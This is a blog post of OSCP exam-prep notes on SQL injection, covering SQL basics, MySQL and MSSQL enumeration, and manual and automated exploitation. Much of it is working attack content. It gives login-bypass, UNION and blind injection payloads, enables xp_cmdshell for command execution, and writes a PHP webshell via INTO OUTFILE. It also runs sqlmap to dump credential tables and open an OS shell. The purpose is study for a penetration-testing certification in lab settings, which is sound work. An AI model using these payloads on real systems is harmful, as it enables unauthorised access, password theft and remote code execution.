---
title: SQL Injection
date: 2024-02-10 03:19:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The SQLi tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# SQL Injection Attacks

## SQL Basics

We will most often come across dbs implementations like MySQL, Microsoft SQL Server, PostgreSQL, and Oracle.

To retrieve all (*) records from the users table where the username is bob:

```sql
SELECT * FROM users WHERE user_name='bob'
```

The following backend PHP shows how a login may work:

```sql
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
Notice that there is no input checking before the user-controlled input is stored and executed. If an attacker were to enter "bob '+!@#$' instead of 'bob', the db would query for SELECT * FROM users WHERE user_name=bob '+!@#$'.

## DB Types

Two of the most common SQL db variants are MySQL and MSSQL. MariaDB is an open-source fork of MySQL.

### MySQL

Connect to a remote SQL instance:

```sql
$ mysql -u root -p'root' -h 111.111.111.111 -P 3306

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.21 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

```sql
> select version();

+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.058 sec)


> select system_user();
+---------------------+
| system_user()       |
+---------------------+
| root@192.168.45.224 |
+---------------------+
1 row in set (0.055 sec)

> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+

> SELECT user, authentication_string FROM mysql.user WHERE user = 'bob';

+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| bob | $A$005$?qvo▒rPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6 |
+--------+------------------------------------------------------------------------+
```

We can see that bob's authentication_string is stored as a Caching-SHA-256 algorithm. We'll learn to crack these later.

### MSSQL

MSSQL natively integrates into Windows. There is a built-in command line tool called SQLCMD that allows use to query SQL dbs within the command prompt or from another remote machine.

Kali offers Impacket, which enables network protocol interactions, including protocols like Tabular Data Stream (TBS) which is adopted by MSSQL and implemented in the impacket-mssqlclient tool.

Let's run impacket-mssqlclient to connect to the remote Windows machine running MSSQL. We'll need a username, password, and the IP.

```console
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@111.111.111.111 -windows-auth

SQL>
```
Don't forget that every db management system has its own syntax.

```sql
SQL> SELECT @@version;
```

Sometimes, when using cmd line tools like sqlcmd, we need to submit our SQL statement ending with a semicolon followed by GO on a separate line. But, when we run commands remotely, we can skip it, since it's not a part of the MSSQL TDS protocol.

```sql
SQL> SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec
```

master, tempdb, model, and msdb are defaults, so we'll exploite offsec.

```sql
SQL> SELECT * FROM offsec.information_schema.tables;
.
.
.
offsec
dbo
users
b'BASE TABLE'

SQL> select * from offsec.dbo.users;
----------   ----------

admin        lab

guest        guest
```

Use the information_schema.tables to determine how you call the FROM location.

## Manual SQL Exploitation

SQL injections are often identified and exploited using automated tools like sqlmap, but let's learn how to manually trigger them. 

### Identifying SQLi via Error-based Payloads

Let's review the basic PHP login logic again:

```php
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

We control the $sql_query here. Let's try for authentication bypass.

We can force a closing quote or add a OR 47=47 followed by a -- comment separator and two forward slashes //.

```sql
// enter this in the login form:
test' OR 47=47 -- //

// this is sent to the backend
SELECT * FROM users WHERE user_name='test' OR 47=47 -- //
```

We can take this a step further by injecting an arbitrary command:

```sql
test' or 47=47 in (select @@version) -- //
test' OR 47=47 in (SELECT * FROM users) -- //
```

We might get an error telling us to only query one column at a time.

```sql
test' or 47=47 in (SELECT password FROM users) -- //
```

This results in a dump of the password hashes, but we need to know what user each is attributed to, or it's unhelpful.

```sql
test' or 47=47 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based Payloads

We should always also test for UNION-based SQL injections. UNION enables execution of another SELECT statement! 

2 Conditions:
- UNION query must include same number of columns as the original query
- Data types need to be compatible between each column

Imagine a webapp has the following pre-configured query:

```sql
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

The LIKE keyword searchs any values containing our input that are followed by 0 or any number of characters, as specified by the % operator.

We first need to know the exact number of columns in the table.

```sql
' ORDER BY 1-- //
```

This statement will fail whenever the selected column does not exist. Increasing the column value by one each time, we will find out the number of columns by subtracting 1 from the error "Unknown column '6' in 'order clause'".

Enumerate the current db name, user, and version.
```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```

We're grabbing all data from the table using the percent sign followed by a single quote, closing the search param. 

Sometimes, you may not receive one or more of your target values. This might be because the column you have instructed it to output to is of the wrong type (integer, string...) Move the values around in your query to appropriately typed fields. Also, you can omit the % this time since we already verified the expected output.

```sql
' UNION SELECT null, null, database(), user(), @@version  -- //
```

Let's try to find some other tables.

```sql
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Imagine we found a table called users with a column called password. Let's grab those credentials...

```
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Blind SQL Injections

Blind SQL Injections refer to when we never see responses from the database and the behavior is inferredd by using time-based or boolean logic.

Imagine we can login to a webapp and see our URL is:

http://192.168.195.16/blindsqli.php?user=offsec

The app here uses the $_GET PHP global var in its source code and queries the user's record to return username and password data.

Boolean-based try:
```
192.168.195.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

Time-based try:
```
192.168.195.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //
```

## Manual and Automated Code Execution

SQL Injections might be able to be used to read or write files in the underlying OS, which we can try to do by writing a PHP file into the root dir of the web server.

In MSSQL, the xp_cmdshell function takes a string and gives it over to a cmd shell to execute. It's disabled by default, but once enabled, must be called with the EXECUTE keyword, not SELECT.

```console
$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';

nt service\mssql$sqlexpress
```

We have full control of the system! Let's change our SQL shell to a standard reverse shell.

While the various MySQL db variants don't offer one single function for RCE, we can abuse the SELECT INTO_OUTFILE statement to write files to the web server. For this to work, the file location has to be writable to the OS user running the db software.

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

The written PGP file then is:
```
<? system($_REQUEST['cmd']); ?>
```

Confirm this worked by accessing the new webshell file i nthe tmp folder with the id command.

```
111.111.111.111/tmp/webshell.php?cmd=id
```

If you get the output of your command, you succeded! The output of the id cmd shows the user that you are executing commands as.

### Automating the Attack

Sqlmap can both identify and exploit SQLi against various db engines. 

```console
sqlmap -u http://111.111.111.111/targetpage.php?user=1 -p user
```

The param (?user=) can be set to a dummy value. 

This commannd can confirm that the URL is vulnerable to SQLi, but we shouldn't stop there. Let's try to dump the db table and steal passwords!

```console
sqlmap -u http://111.111.111.111/targetpage.php?user=1 -p user --dump
```

It's important to note that time-based SQLis will take a longer time to fetch this information.

Sqlmap also offers the --os-shell feature, which is a param that provides us a full interactive shell.

Time-based SQLi, again, will not be an ideal candidate for an interactive shell due to slowness.

Intercept the POST and save it to a txt file.

```
POST /search.php HTTP/1.1
Host: 111.111.111.111
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://111.111.111.111
Connection: close
Referer: http://111.111.111.111/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```

Run Sqlmap with the -r param to include this txt file. Use the -p to indicate which param is vulnerable to SQLi.

```console
$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

You will be prompted for the web app's language, and then given a shell.
